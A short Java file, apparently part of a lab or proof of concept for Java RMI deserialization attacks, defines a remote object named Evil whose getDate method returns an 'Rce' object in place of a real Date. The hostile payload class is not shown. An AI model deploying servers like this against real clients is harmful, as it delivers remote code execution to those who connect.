package rmi;

import java.io.IOException;
import java.rmi.RemoteException;
import java.util.Date;

public class Evil
  extends java.rmi.server.UnicastRemoteObject
  implements RmtServer {

  public Evil() throws RemoteException, IOException {}

  public Date getDate() throws RemoteException {
    Date d = null;
    try {
      d = new Rce();
    } catch (IOException e) {
      // TODO Auto-generated catch block
      e.printStackTrace();
    }
    return d;
  }

  public Integer add(Integer a, Integer b) throws RemoteException {
    return 100;
  }

  public String whichAnimal(Animal a) throws RemoteException {
    return a.toString();
  }
}
